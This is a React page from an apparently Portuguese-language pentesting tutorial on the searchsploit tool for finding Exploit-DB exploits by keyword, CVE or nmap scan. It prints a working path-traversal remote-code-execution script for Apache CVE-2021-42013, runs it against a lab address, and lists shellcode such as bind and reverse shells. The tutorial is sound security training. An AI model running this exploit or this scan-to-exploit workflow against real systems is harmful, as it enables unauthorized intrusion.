import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Searchsploit() {
  return (
    <PageContainer
      title="Searchsploit — Exploit-DB local"
      subtitle="Banco de exploits offline (50000+) navegável por keyword, CVE, autor, plataforma."
      difficulty="iniciante"
      timeToRead="9 min"
    >
      <h2>Setup</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y exploitdb",
            out: "(já vem no kali-tools-exploitation)",
            outType: "muted",
          },
          {
            cmd: "searchsploit --version",
            out: `searchsploit version: 4.2.5
Database location: /usr/share/exploitdb/`,
            outType: "info",
          },
          {
            comment: "atualizar o banco (faz git pull em /usr/share/exploitdb)",
            cmd: "sudo searchsploit -u",
            out: `[i] Updating: master
[i] Pulling exploits & shellcodes from /usr/share/exploitdb...
remote: Enumerating objects: 142, done.
remote: Counting objects: 100% (108/108), done.
remote: Total 142 (delta 87), reused 87 (delta 87), pack-reused 34
Receiving objects: 100% (142/142), 312.42 KiB | 4.21 MiB/s, done.

[i] Removed file: /usr/share/exploitdb/exploits/php/webapps/49102.txt
[i] Updated file: /usr/share/exploitdb/files_exploits.csv

[*] Update finished. Database now contains 50124 exploits and 1421 shellcodes.`,
            outType: "success",
          },
        ]}
      />

      <h2>Buscar</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "searchsploit wordpress 5.7",
            out: `--------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                |  Path
--------------------------------------------------------------- ----------------------------------------
WordPress 5.7 - 'Media Library' Authenticated Arbitrary Fil    | php/webapps/49344.txt
WordPress Plugin All-in-One SEO Pack 4.1.5.2 - Auth. Stored    | php/webapps/50953.txt
WordPress Plugin Backup Migration 1.3.7 - Remote Code Exec     | php/webapps/51985.py
WordPress Plugin Elementor 3.6.2 - Authenticated Remote Cod    | php/webapps/50801.py
WordPress Plugin File Manager 6.9 - Unauthenticated Remote     | php/webapps/49178.rb
WordPress Plugin WP Sync DB 1.6 - SQL Injection (Unauthent     | php/webapps/49327.txt
--------------------------------------------------------------- ----------------------------------------
Shellcodes: No Results`,
            outType: "info",
          },
          {
            cmd: "searchsploit apache 2.4.49",
            out: `------------------------------------------------------------- ----------------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------- ----------------------------------------
Apache 2.4.49 - Path Traversal & Remote Code Execution       | multiple/webapps/50383.py
Apache 2.4.49/2.4.50 - Path Traversal (CVE-2021-42013)       | multiple/webapps/50406.sh
Apache HTTP Server 2.4.49 - Path Traversal (CVE-2021-41773)  | multiple/webapps/50438.py
------------------------------------------------------------- ----------------------------------------`,
            outType: "warning",
          },
          {
            cmd: "searchsploit smb 'eternal blue'",
            out: `--------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                |  Path
--------------------------------------------------------------- ----------------------------------------
Microsoft SMBv1 - Remote Code Execution (MS17-010)            | windows/remote/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code   | windows/remote/42031.py
Microsoft Windows 8/8.1/2012 R2 - 'EternalBlue' SMB Remote    | windows/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB  | windows/remote/41987.py
--------------------------------------------------------------- ----------------------------------------`,
            outType: "warning",
          },
        ]}
      />

      <CommandTable
        title="Flags úteis"
        variations={[
          { cmd: "-t / --title", desc: "Buscar SÓ no título (mais preciso).", output: "Reduz falsos positivos." },
          { cmd: "-w / --www", desc: "Mostra link da Exploit-DB online.", output: "Útil para abrir no browser." },
          { cmd: "-x / --examine", desc: "Abre o exploit no $PAGER.", output: "Veja o código antes de rodar." },
          { cmd: "-m / --mirror", desc: "Copia o exploit para o cwd.", output: "Mantém autoria intacta." },
          { cmd: "-c / --case", desc: "Case-sensitive.", output: "Para nomes específicos." },
          { cmd: "-p / --path", desc: "Mostra path completo.", output: "Útil para script." },
          { cmd: "-j / --json", desc: "Saída JSON.", output: "Pra automação/parse." },
          { cmd: "--cve CVE-2021-41773", desc: "Busca por CVE.", output: "Match exato em CVE." },
          { cmd: "--id 50438", desc: "Por ID do EDB.", output: "Direto." },
          { cmd: "--exclude='dos|local'", desc: "Exclui resultados (regex).", output: "Foca em remote/webapps." },
          { cmd: "-o / --overflow", desc: "Mostra mesmo se cortar (longas linhas).", output: "Não trunca." },
          { cmd: "--nmap", desc: "Lê arquivo nmap (XML/.nmap) e busca exploits.", output: "Auto-pivot do scan." },
        ]}
      />

      <h2>Examinar e copiar</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "searchsploit -p 50406",
            out: `  Exploit: Apache 2.4.49/2.4.50 - Path Traversal (CVE-2021-42013)
      URL: https://www.exploit-db.com/exploits/50406
     Path: /usr/share/exploitdb/exploits/multiple/webapps/50406.sh
File Type: Bourne-Again shell script, ASCII text executable

Copied EDB-ID #50406's path to the clipboard.`,
            outType: "info",
          },
          {
            cmd: "searchsploit -m 50406",
            out: `  Exploit: Apache 2.4.49/2.4.50 - Path Traversal (CVE-2021-42013)
      URL: https://www.exploit-db.com/exploits/50406
     Path: /usr/share/exploitdb/exploits/multiple/webapps/50406.sh
File Type: Bourne-Again shell script, ASCII text executable

Copied to: /home/wallyson/50406.sh`,
            outType: "success",
          },
          {
            cmd: "cat 50406.sh",
            out: `#!/bin/bash
# Apache 2.4.49/2.4.50 Path Traversal & RCE (CVE-2021-42013)
# Author: Lucas Dorea Cardoso (h4xx0rk1ng)

if [ -z "$1" ]; then
    echo "Usage: $0 <target>"
    exit
fi

TARGET=$1

curl --silent --path-as-is --insecure --data "echo Content-Type: text/plain; echo; id" \\
  "$TARGET/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh"`,
            outType: "default",
          },
          {
            cmd: "bash 50406.sh http://10.10.10.5",
            out: `uid=1(daemon) gid=1(daemon) groups=1(daemon)`,
            outType: "warning",
          },
        ]}
      />

      <h2>Integração com nmap</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "scan + exploit suggest em uma só passada",
            cmd: "sudo nmap -sV -oX scan.xml 10.10.10.5",
            out: "(roda nmap normal)",
            outType: "muted",
          },
          {
            cmd: "searchsploit --nmap scan.xml",
            out: `[i] SearchSploit auto-search: -t '6.6.1p1 Ubuntu 2ubuntu2.13'
[i] SearchSploit auto-search: -t 'Apache httpd 2.4.7'
[i] SearchSploit auto-search: -t 'nping-echo'

------------------------------------------------------------- ----------------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------- ----------------------------------------
OpenSSH 6.6.1p1 - 'logjam' Diffie-Hellman Weakness          | linux/remote/37537.py
Apache 2.4.7 - mod_status Buffer Overflow                   | linux/dos/35921.py
------------------------------------------------------------- ----------------------------------------`,
            outType: "info",
          },
        ]}
      />

      <h2>Por CVE</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "searchsploit --cve CVE-2021-42013",
            out: `------------------------------------------------------------- ----------------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------- ----------------------------------------
Apache 2.4.49/2.4.50 - Path Traversal (CVE-2021-42013)      | multiple/webapps/50406.sh
Apache 2.4.49/2.4.50 - Path Traversal & RCE (CVE-2021-42013)| multiple/webapps/50512.py
------------------------------------------------------------- ----------------------------------------`,
            outType: "info",
          },
          {
            cmd: "searchsploit --cve CVE-2024-3094",
            out: `Exploits: No Results
Shellcodes: No Results
Papers: 1 Result(s)
xz Utils 5.6.0/5.6.1 - Backdoor (CVE-2024-3094) — Analysis    | analysis/papers/CVE-2024-3094.pdf`,
            outType: "warning",
          },
        ]}
      />

      <h2>Buscar shellcodes</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "searchsploit shellcode linux x86_64",
            out: `------------------------------------------------------------- ----------------------------------------
 Shellcode Title                                            |  Path
------------------------------------------------------------- ----------------------------------------
Linux/x86_64 - Add Root User (r00t/r00t) Shellcode (149 byt | linux_x86-64/45156.c
Linux/x86_64 - Bind TCP (4444/TCP) Shellcode (110 bytes)    | linux_x86-64/45153.c
Linux/x86_64 - execve(/bin/sh) Shellcode (27 bytes)         | linux_x86-64/47008.c
Linux/x86_64 - Reverse TCP Shellcode (Generator)            | linux_x86-64/47008.py
------------------------------------------------------------- ----------------------------------------`,
            outType: "info",
          },
        ]}
      />

      <h2>Site oficial — exploit-db.com</h2>
      <p>
        Quando o exploit é muito recente (publicado nos últimos dias), pode não estar no
        searchsploit ainda. Sempre confira:
      </p>
      <ul>
        <li>
          <a href="https://www.exploit-db.com" target="_blank" rel="noreferrer">https://www.exploit-db.com</a> — banco principal.
        </li>
        <li>
          <a href="https://github.com/trickest/cve" target="_blank" rel="noreferrer">https://github.com/trickest/cve</a> — agregador automatizado.
        </li>
        <li>
          <a href="https://github.com/Threekiii/Awesome-POC" target="_blank" rel="noreferrer">https://github.com/Threekiii/Awesome-POC</a> — coleção PoC.
        </li>
        <li>
          <a href="https://nuclei.projectdiscovery.io/templates" target="_blank" rel="noreferrer">Nuclei templates</a> — escaneamento massa para CVEs ativos.
        </li>
      </ul>

      <PracticeBox
        title="Achar e rodar exploit a partir de scan"
        goal="Pipeline completo: scan → import → searchsploit → executar."
        steps={[
          "nmap -sV em alvo (lab).",
          "searchsploit --nmap em cima do XML.",
          "Para cada match interessante: -p para examinar, -m para copiar.",
          "Leia o exploit ANTES de rodar.",
          "Rode em laboratório.",
        ]}
        command={`TARGET=10.10.10.3
sudo nmap -sV -oX target.xml $TARGET
searchsploit --nmap target.xml -t

# escolha um match, ex EDB-ID 12345
searchsploit -p 12345
searchsploit -m 12345

# leia, depois rode
cat 12345.* | head -50
# python3 12345.py $TARGET   (ou bash, ruby, c+make)`}
        expected={`(linha de exploits sugeridos baseados em versão exata)
Exploit: Apache 2.4.49 - Path Traversal (CVE-2021-41773)
Path:    /usr/share/exploitdb/exploits/multiple/webapps/50438.py
Copied to: /home/wallyson/50438.py`}
        verify="NUNCA rode um exploit sem ler primeiro. Pode haver código malicioso plantado no PoC."
      />

      <AlertBox type="danger" title="Exploits podem ser maliciosos">
        Há casos documentados de "PoCs" no GitHub que na verdade são malware contra
        pesquisadores. SEMPRE leia o exploit antes de rodar — atenção a curl/wget para
        domínios suspeitos, base64 encoded, downloads em /tmp.
      </AlertBox>
    </PageContainer>
  );
}
